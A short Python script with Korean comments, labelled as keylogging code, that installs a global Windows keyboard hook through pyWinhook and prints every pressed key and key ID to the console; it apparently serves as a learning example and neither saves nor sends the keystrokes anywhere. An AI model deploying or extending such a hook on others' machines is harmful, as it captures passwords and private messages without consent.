#키로깅 코드

#pythoncom : 파이썬이 Windows시스템의 다양한 서비스 및 기능을 사용하기 위해 사용하는 패키지
import pythoncom
import pyWinhook as pyHook


#키보드 입력을 후킹한 후 호출되는 콜백 함수
def OnKeyboardEvent(event):
	print('++ Key:', event.Key, end='')
	print('	KeyID:', event.KeyID)
	return True


def run():
	hm = pyHook.HookManager()
	#후킹을 처리할 콜백 함수 지정
	hm.KeyDown = OnKeyboardEvent
	#키보드 후킹을 설정하는 함수
	hm.HookKeyboard()
	#윈도우 OS에서 입력된 이벤트들을 모두 전송받을 수 있게 함
	#이벤트 없으면 여기서 대기
	pythoncom.PumpMessages()


def main():
	run()


main()
